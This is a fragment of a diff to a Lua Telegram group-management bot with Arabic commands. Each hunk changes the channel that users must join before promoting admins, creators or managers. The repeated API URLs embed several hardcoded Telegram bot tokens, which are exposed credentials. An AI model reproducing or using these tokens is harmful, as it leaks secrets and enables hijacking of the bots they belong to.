-local res = https.request('https://api.telegram.org/bot811517309:AAEBec_wk81nh6and9t2vp8znFFTbLclp94/getChatMember?chat_id=@SNIEBR&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot811517309:AAEBec_wk81nh6and9t2vp8znFFTbLclp94/getChatMember?chat_id=@SNIEBR&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot666998640:AAEOwMMQU8pzy60wLF23EiXjbfVsI6jrQAk/getChatMember?chat_id=@SNIEBR&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot827950325:AAGjaAxIwupH9vWLvB3JIRZRGFHhSVZsM9Y/getChatMember?chat_id=@SNIEBR&user_id='..msg.sender_user_id_)--ttps.request('https://teamstorm.tk/joinch/?id='..msg.sender_user_id_..'')
--- @SNIEBRFreeON.decode(url)
-if res:match('"status":"left"') or res:match('USER_ID_INVALID') or res:match('kicked') then --@SNIEBRfreer.SNIEBR ~= true then
-send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @SNIEBR ⚜️\n', 1, 'html')   
+local res = https.request('https://api.telegram.org/bot797867930:AAHgvjmTuhSo1-z-NOwQk-S-dm6L-iyKdj8/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot797867930:AAHgvjmTuhSo1-z-NOwQk-S-dm6L-iyKdj8/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot666998640:AAEOwMMQU8pzy60wLF23EiXjbfVsI6jrQAk/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot827950325:AAGjaAxIwupH9vWLvB3JIRZRGFHhSVZsM9Y/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://teamstorm.tk/joinch/?id='..msg.sender_user_id_..'')
+-- @XOUXUFreeON.decode(url)
+if res:match('"status":"left"') or res:match('USER_ID_INVALID') or res:match('kicked') then --@XOUXUfreer.SNIEBR ~= true then
+send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @XOUXU ⚜️\n', 1, 'html')   
 return false end
 datahmade:sadd('SNIEBR:'..bot_id..'creator:'..msg.chat_id_, apow[2])
 tsX000(apow[2],msg,"🔖┇تم رفعة منشئ  في البوت")
@@ -3786,20 +3796,20 @@ end
 
 if text and text:match("^رفع ادمن بالكروب (%d+)$") then
 local apmd = {string.match(text, "^(رفع ادمن بالكروب) (%d+)$")}
-local res = https.request('https://api.telegram.org/bot811517309:AAEBec_wk81nh6and9t2vp8znFFTbLclp94/getChatMember?chat_id=@SNIEBR&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot811517309:AAEBec_wk81nh6and9t2vp8znFFTbLclp94/getChatMember?chat_id=@SNIEBR&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot666998640:AAEOwMMQU8pzy60wLF23EiXjbfVsI6jrQAk/getChatMember?chat_id=@SNIEBR&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot827950325:AAGjaAxIwupH9vWLvB3JIRZRGFHhSVZsM9Y/getChatMember?chat_id=@SNIEBR&user_id='..msg.sender_user_id_)--ttps.request('https://teamstorm.tk/joinch/?id='..msg.sender_user_id_..'')
--- @SNIEBRFreeON.decode(url)
-if res:match('"status":"left"') or res:match('USER_ID_INVALID') or res:match('kicked') then --@SNIEBRfreer.SNIEBR ~= true then
-send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @SNIEBR ⚜️\n', 1, 'html')   
+local res = https.request('https://api.telegram.org/bot797867930:AAHgvjmTuhSo1-z-NOwQk-S-dm6L-iyKdj8/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot797867930:AAHgvjmTuhSo1-z-NOwQk-S-dm6L-iyKdj8/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot666998640:AAEOwMMQU8pzy60wLF23EiXjbfVsI6jrQAk/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot827950325:AAGjaAxIwupH9vWLvB3JIRZRGFHhSVZsM9Y/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://teamstorm.tk/joinch/?id='..msg.sender_user_id_..'')
+-- @XOUXUFreeON.decode(url)
+if res:match('"status":"left"') or res:match('USER_ID_INVALID') or res:match('kicked') then --@XOUXUfreer.SNIEBR ~= true then
+send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @XOUXU ⚜️\n', 1, 'html')   
 return false end
 HTTPS.request("https://api.telegram.org/bot" .. token .. "/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..apmd[2].."&can_change_info=True&can_delete_messages=True&can_invite_users=True&can_restrict_members=True&can_pin_messages=True&can_promote_members=false")
 tsX000(apmd[2],msg,'🔖┇تم رفعة ادمن   في الكروب')
 return false
 end
 if text == ("رفع ادمن بالكروب")  and msg.reply_to_message_id_ then
-local res = https.request('https://api.telegram.org/bot811517309:AAEBec_wk81nh6and9t2vp8znFFTbLclp94/getChatMember?chat_id=@SNIEBR&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot811517309:AAEBec_wk81nh6and9t2vp8znFFTbLclp94/getChatMember?chat_id=@SNIEBR&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot666998640:AAEOwMMQU8pzy60wLF23EiXjbfVsI6jrQAk/getChatMember?chat_id=@SNIEBR&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot827950325:AAGjaAxIwupH9vWLvB3JIRZRGFHhSVZsM9Y/getChatMember?chat_id=@SNIEBR&user_id='..msg.sender_user_id_)--ttps.request('https://teamstorm.tk/joinch/?id='..msg.sender_user_id_..'')
--- @SNIEBRFreeON.decode(url)
-if res:match('"status":"left"') or res:match('USER_ID_INVALID') or res:match('kicked') then --@SNIEBRfreer.SNIEBR ~= true then
-send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @SNIEBR ⚜️\n', 1, 'html')   
+local res = https.request('https://api.telegram.org/bot797867930:AAHgvjmTuhSo1-z-NOwQk-S-dm6L-iyKdj8/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot797867930:AAHgvjmTuhSo1-z-NOwQk-S-dm6L-iyKdj8/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot666998640:AAEOwMMQU8pzy60wLF23EiXjbfVsI6jrQAk/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot827950325:AAGjaAxIwupH9vWLvB3JIRZRGFHhSVZsM9Y/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://teamstorm.tk/joinch/?id='..msg.sender_user_id_..'')
+-- @XOUXUFreeON.decode(url)
+if res:match('"status":"left"') or res:match('USER_ID_INVALID') or res:match('kicked') then --@XOUXUfreer.SNIEBR ~= true then
+send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @XOUXU ⚜️\n', 1, 'html')   
 return false end
 function promote_by_reply(extra, result, success)
 HTTPS.request("https://api.telegram.org/bot" .. token .. "/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.sender_user_id_.."&can_change_info=True&can_delete_messages=True&can_invite_users=True&can_restrict_members=True&can_pin_messages=True&can_promote_members=false")
@@ -3809,10 +3819,10 @@ getMessage(msg.chat_id_, msg.reply_to_message_id_,promote_by_reply)
 return false
 end
 if text and text:match("^رفع ادمن بالكروب @(.*)$") then
-local res = https.request('https://api.telegram.org/bot811517309:AAEBec_wk81nh6and9t2vp8znFFTbLclp94/getChatMember?chat_id=@SNIEBR&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot811517309:AAEBec_wk81nh6and9t2vp8znFFTbLclp94/getChatMember?chat_id=@SNIEBR&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot666998640:AAEOwMMQU8pzy60wLF23EiXjbfVsI6jrQAk/getChatMember?chat_id=@SNIEBR&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot827950325:AAGjaAxIwupH9vWLvB3JIRZRGFHhSVZsM9Y/getChatMember?chat_id=@SNIEBR&user_id='..msg.sender_user_id_)--ttps.request('https://teamstorm.tk/joinch/?id='..msg.sender_user_id_..'')
--- @SNIEBRFreeON.decode(url)
-if res:match('"status":"left"') or res:match('USER_ID_INVALID') or res:match('kicked') then --@SNIEBRfreer.SNIEBR ~= true then
-send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @SNIEBR ⚜️\n', 1, 'html')   
+local res = https.request('https://api.telegram.org/bot797867930:AAHgvjmTuhSo1-z-NOwQk-S-dm6L-iyKdj8/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot797867930:AAHgvjmTuhSo1-z-NOwQk-S-dm6L-iyKdj8/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot666998640:AAEOwMMQU8pzy60wLF23EiXjbfVsI6jrQAk/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot827950325:AAGjaAxIwupH9vWLvB3JIRZRGFHhSVZsM9Y/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://teamstorm.tk/joinch/?id='..msg.sender_user_id_..'')
+-- @XOUXUFreeON.decode(url)
+if res:match('"status":"left"') or res:match('USER_ID_INVALID') or res:match('kicked') then --@XOUXUfreer.SNIEBR ~= true then
+send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @XOUXU ⚜️\n', 1, 'html')   
 return false end
 local apmd = {string.match(text, "^(رفع ادمن بالكروب) @(.*)$")}
 function promote_by_username(extra, result, success)
@@ -3833,20 +3843,20 @@ return false
 end
 if text and text:match("^رفع منشئ بالكروب (%d+)$") then
 local apmd = {string.match(text, "^(رفع منشئ بالكروب) (%d+)$")}
-local res = https.request('https://api.telegram.org/bot811517309:AAEBec_wk81nh6and9t2vp8znFFTbLclp94/getChatMember?chat_id=@SNIEBR&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot811517309:AAEBec_wk81nh6and9t2vp8znFFTbLclp94/getChatMember?chat_id=@SNIEBR&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot666998640:AAEOwMMQU8pzy60wLF23EiXjbfVsI6jrQAk/getChatMember?chat_id=@SNIEBR&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot827950325:AAGjaAxIwupH9vWLvB3JIRZRGFHhSVZsM9Y/getChatMember?chat_id=@SNIEBR&user_id='..msg.sender_user_id_)--ttps.request('https://teamstorm.tk/joinch/?id='..msg.sender_user_id_..'')
--- @SNIEBRFreeON.decode(url)
-if res:match('"status":"left"') or res:match('USER_ID_INVALID') or res:match('kicked') then --@SNIEBRfreer.SNIEBR ~= true then
-send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @SNIEBR ⚜️\n', 1, 'html')   
+local res = https.request('https://api.telegram.org/bot797867930:AAHgvjmTuhSo1-z-NOwQk-S-dm6L-iyKdj8/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot797867930:AAHgvjmTuhSo1-z-NOwQk-S-dm6L-iyKdj8/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot666998640:AAEOwMMQU8pzy60wLF23EiXjbfVsI6jrQAk/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot827950325:AAGjaAxIwupH9vWLvB3JIRZRGFHhSVZsM9Y/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://teamstorm.tk/joinch/?id='..msg.sender_user_id_..'')
+-- @XOUXUFreeON.decode(url)
+if res:match('"status":"left"') or res:match('USER_ID_INVALID') or res:match('kicked') then --@XOUXUfreer.SNIEBR ~= true then
+send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @XOUXU ⚜️\n', 1, 'html')   
 return false end
 HTTPS.request("https://api.telegram.org/bot" .. token .. "/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..apmd[2].."&can_change_info=True&can_delete_messages=True&can_invite_users=True&can_restrict_members=True&can_pin_messages=True&can_promote_members=True")
 tsX000(apmd[2],msg,'📮┇تم رفعة منشئ   في الكروب')
 return false
 end
 if text == ("رفع منشئ بالكروب")  and msg.reply_to_message_id_ then
-local res = https.request('https://api.telegram.org/bot811517309:AAEBec_wk81nh6and9t2vp8znFFTbLclp94/getChatMember?chat_id=@SNIEBR&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot811517309:AAEBec_wk81nh6and9t2vp8znFFTbLclp94/getChatMember?chat_id=@SNIEBR&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot666998640:AAEOwMMQU8pzy60wLF23EiXjbfVsI6jrQAk/getChatMember?chat_id=@SNIEBR&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot827950325:AAGjaAxIwupH9vWLvB3JIRZRGFHhSVZsM9Y/getChatMember?chat_id=@SNIEBR&user_id='..msg.sender_user_id_)--ttps.request('https://teamstorm.tk/joinch/?id='..msg.sender_user_id_..'')
--- @SNIEBRFreeON.decode(url)
-if res:match('"status":"left"') or res:match('USER_ID_INVALID') or res:match('kicked') then --@SNIEBRfreer.SNIEBR ~= true then
-send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @SNIEBR ⚜️\n', 1, 'html')   
+local res = https.request('https://api.telegram.org/bot797867930:AAHgvjmTuhSo1-z-NOwQk-S-dm6L-iyKdj8/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot797867930:AAHgvjmTuhSo1-z-NOwQk-S-dm6L-iyKdj8/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot666998640:AAEOwMMQU8pzy60wLF23EiXjbfVsI6jrQAk/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot827950325:AAGjaAxIwupH9vWLvB3JIRZRGFHhSVZsM9Y/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://teamstorm.tk/joinch/?id='..msg.sender_user_id_..'')
+-- @XOUXUFreeON.decode(url)
+if res:match('"status":"left"') or res:match('USER_ID_INVALID') or res:match('kicked') then --@XOUXUfreer.SNIEBR ~= true then
+send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @XOUXU ⚜️\n', 1, 'html')   
 return false end
 function promote_by_reply(extra, result, success)
 HTTPS.request("https://api.telegram.org/bot" .. token .. "/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.sender_user_id_.."&can_change_info=True&can_delete_messages=True&can_invite_users=True&can_restrict_members=True&can_pin_messages=True&can_promote_members=True")
@@ -3856,10 +3866,10 @@ getMessage(msg.chat_id_, msg.reply_to_message_id_,promote_by_reply)
 return false
 end
 if text and text:match("^رفع منشئ بالكروب @(.*)$") then
-local res = https.request('https://api.telegram.org/bot811517309:AAEBec_wk81nh6and9t2vp8znFFTbLclp94/getChatMember?chat_id=@SNIEBR&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot811517309:AAEBec_wk81nh6and9t2vp8znFFTbLclp94/getChatMember?chat_id=@SNIEBR&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot666998640:AAEOwMMQU8pzy60wLF23EiXjbfVsI6jrQAk/getChatMember?chat_id=@SNIEBR&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot827950325:AAGjaAxIwupH9vWLvB3JIRZRGFHhSVZsM9Y/getChatMember?chat_id=@SNIEBR&user_id='..msg.sender_user_id_)--ttps.request('https://teamstorm.tk/joinch/?id='..msg.sender_user_id_..'')
--- @SNIEBRFreeON.decode(url)
-if res:match('"status":"left"') or res:match('USER_ID_INVALID') or res:match('kicked') then --@SNIEBRfreer.SNIEBR ~= true then
-send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @SNIEBR ⚜️\n', 1, 'html')   
+local res = https.request('https://api.telegram.org/bot797867930:AAHgvjmTuhSo1-z-NOwQk-S-dm6L-iyKdj8/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot797867930:AAHgvjmTuhSo1-z-NOwQk-S-dm6L-iyKdj8/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot666998640:AAEOwMMQU8pzy60wLF23EiXjbfVsI6jrQAk/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot827950325:AAGjaAxIwupH9vWLvB3JIRZRGFHhSVZsM9Y/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://teamstorm.tk/joinch/?id='..msg.sender_user_id_..'')
+-- @XOUXUFreeON.decode(url)
+if res:match('"status":"left"') or res:match('USER_ID_INVALID') or res:match('kicked') then --@XOUXUfreer.SNIEBR ~= true then
+send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @XOUXU ⚜️\n', 1, 'html')   
 return false end
 local apmd = {string.match(text, "^(رفع منشئ بالكروب) @(.*)$")}
 function promote_by_username(extra, result, success)
@@ -3982,10 +3992,10 @@ texts = '✖┇ تم مسح المدراء '
 send(msg.chat_id_, msg.id_, 1, texts, 1, 'md')
 end
 if text == ("رفع مدير") and msg.reply_to_message_id_ then
-local res = https.request('https://api.telegram.org/bot811517309:AAEBec_wk81nh6and9t2vp8znFFTbLclp94/getChatMember?chat_id=@SNIEBR&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot811517309:AAEBec_wk81nh6and9t2vp8znFFTbLclp94/getChatMember?chat_id=@SNIEBR&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot666998640:AAEOwMMQU8pzy60wLF23EiXjbfVsI6jrQAk/getChatMember?chat_id=@SNIEBR&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot827950325:AAGjaAxIwupH9vWLvB3JIRZRGFHhSVZsM9Y/getChatMember?chat_id=@SNIEBR&user_id='..msg.sender_user_id_)--ttps.request('https://teamstorm.tk/joinch/?id='..msg.sender_user_id_..'')
--- @SNIEBRFreeON.decode(url)
-if res:match('"status":"left"') or res:match('USER_ID_INVALID') or res:match('kicked') then --@SNIEBRfreer.SNIEBR ~= true then
-send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @SNIEBR ⚜️\n', 1, 'html')   
+local res = https.request('https://api.telegram.org/bot797867930:AAHgvjmTuhSo1-z-NOwQk-S-dm6L-iyKdj8/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot797867930:AAHgvjmTuhSo1-z-NOwQk-S-dm6L-iyKdj8/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot666998640:AAEOwMMQU8pzy60wLF23EiXjbfVsI6jrQAk/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot827950325:AAGjaAxIwupH9vWLvB3JIRZRGFHhSVZsM9Y/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://teamstorm.tk/joinch/?id='..msg.sender_user_id_..'')
+-- @XOUXUFreeON.decode(url)
+if res:match('"status":"left"') or res:match('USER_ID_INVALID') or res:match('kicked') then --@XOUXUfreer.SNIEBR ~= true then
+send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @XOUXU ⚜️\n', 1, 'html')   
 return false end
 function setowner_by_reply(extra, result, success)
 local hash =  'SNIEBR:'..bot_id..'owners:'..msg.chat_id_
@@ -4000,10 +4010,10 @@ getMessage(msg.chat_id_, msg.reply_to_message_id_,setowner_by_reply)
 return false
 end  
 if text and text:match("^رفع مدير @(.*)$") then
-local res = https.request('https://api.telegram.org/bot811517309:AAEBec_wk81nh6and9t2vp8znFFTbLclp94/getChatMember?chat_id=@SNIEBR&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot811517309:AAEBec_wk81nh6and9t2vp8znFFTbLclp94/getChatMember?chat_id=@SNIEBR&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot666998640:AAEOwMMQU8pzy60wLF23EiXjbfVsI6jrQAk/getChatMember?chat_id=@SNIEBR&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot827950325:AAGjaAxIwupH9vWLvB3JIRZRGFHhSVZsM9Y/getChatMember?chat_id=@SNIEBR&user_id='..msg.sender_user_id_)--ttps.request('https://teamstorm.tk/joinch/?id='..msg.sender_user_id_..'')
--- @SNIEBRFreeON.decode(url)
-if res:match('"status":"left"') or res:match('USER_ID_INVALID') or res:match('kicked') then --@SNIEBRfreer.SNIEBR ~= true then
-send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @SNIEBR ⚜️\n', 1, 'html')   
+local res = https.request('https://api.telegram.org/bot797867930:AAHgvjmTuhSo1-z-NOwQk-S-dm6L-iyKdj8/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot797867930:AAHgvjmTuhSo1-z-NOwQk-S-dm6L-iyKdj8/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot666998640:AAEOwMMQU8pzy60wLF23EiXjbfVsI6jrQAk/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot827950325:AAGjaAxIwupH9vWLvB3JIRZRGFHhSVZsM9Y/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://teamstorm.tk/joinch/?id='..msg.sender_user_id_..'')
+-- @XOUXUFreeON.decode(url)
+if res:match('"status":"left"') or res:match('USER_ID_INVALID') or res:match('kicked') then --@XOUXUfreer.SNIEBR ~= true then
+send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @XOUXU ⚜️\n', 1, 'html')   
 return false end
 local apow = {string.match(text, "^(رفع مدير) @(.*)$")}
 function setowner_by_username(extra, result, success)
@@ -4024,10 +4034,10 @@ return false
 end 
 
 if text and text:match("^رفع مدير (%d+)$") then
-local res = https.request('https://api.telegram.org/bot811517309:AAEBec_wk81nh6and9t2vp8znFFTbLclp94/getChatMember?chat_id=@SNIEBR&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot811517309:AAEBec_wk81nh6and9t2vp8znFFTbLclp94/getChatMember?chat_id=@SNIEBR&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot666998640:AAEOwMMQU8pzy60wLF23EiXjbfVsI6jrQAk/getChatMember?chat_id=@SNIEBR&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot827950325:AAGjaAxIwupH9vWLvB3JIRZRGFHhSVZsM9Y/getChatMember?chat_id=@SNIEBR&user_id='..msg.sender_user_id_)--ttps.request('https://teamstorm.tk/joinch/?id='..msg.sender_user_id_..'')
--- @SNIEBRFreeON.decode(url)
-if res:match('"status":"left"') or res:match('USER_ID_INVALID') or res:match('kicked') then --@SNIEBRfreer.SNIEBR ~= true then
-send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @SNIEBR ⚜️\n', 1, 'html')   
+local res = https.request('https://api.telegram.org/bot797867930:AAHgvjmTuhSo1-z-NOwQk-S-dm6L-iyKdj8/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot797867930:AAHgvjmTuhSo1-z-NOwQk-S-dm6L-iyKdj8/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot666998640:AAEOwMMQU8pzy60wLF23EiXjbfVsI6jrQAk/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot827950325:AAGjaAxIwupH9vWLvB3JIRZRGFHhSVZsM9Y/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://teamstorm.tk/joinch/?id='..msg.sender_user_id_..'')
+-- @XOUXUFreeON.decode(url)
+if res:match('"status":"left"') or res:match('USER_ID_INVALID') or res:match('kicked') then --@XOUXUfreer.SNIEBR ~= true then
+send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @XOUXU ⚜️\n', 1, 'html')   
 return false end
 local apow = {string.match(text, "^(رفع مدير) (%d+)$")}
 datahmade:sadd('SNIEBR:'..bot_id..'owners:'..msg.chat_id_, apow[2])
@@ -4035,10 +4045,10 @@ tsX000(apow[2],msg,"🔖┇تم رفعة مدير في البوت")
 return false
 end  
 if text == ("تنزيل مدير") and msg.reply_to_message_id_ then
-local res = https.request('https://api.telegram.org/bot811517309:AAEBec_wk81nh6and9t2vp8znFFTbLclp94/getChatMember?chat_id=@SNIEBR&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot811517309:AAEBec_wk81nh6and9t2vp8znFFTbLclp94/getChatMember?chat_id=@SNIEBR&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot666998640:AAEOwMMQU8pzy60wLF23EiXjbfVsI6jrQAk/getChatMember?chat_id=@SNIEBR&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot827950325:AAGjaAxIwupH9vWLvB3JIRZRGFHhSVZsM9Y/getChatMember?chat_id=@SNIEBR&user_id='..msg.sender_user_id_)--ttps.request('https://teamstorm.tk/joinch/?id='..msg.sender_user_id_..'')
--- @SNIEBRFreeON.decode(url)
-if res:match('"status":"left"') or res:match('USER_ID_INVALID') or res:match('kicked') then --@SNIEBRfreer.SNIEBR ~= true then
-send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @SNIEBR ⚜️\n', 1, 'html')   
+local res = https.request('https://api.telegram.org/bot797867930:AAHgvjmTuhSo1-z-NOwQk-S-dm6L-iyKdj8/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot797867930:AAHgvjmTuhSo1-z-NOwQk-S-dm6L-iyKdj8/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot666998640:AAEOwMMQU8pzy60wLF23EiXjbfVsI6jrQAk/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot827950325:AAGjaAxIwupH9vWLvB3JIRZRGFHhSVZsM9Y/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://teamstorm.tk/joinch/?id='..msg.sender_user_id_..'')
+-- @XOUXUFreeON.decode(url)
+if res:match('"status":"left"') or res:match('USER_ID_INVALID') or res:match('kicked') then --@XOUXUfreer.SNIEBR ~= true then
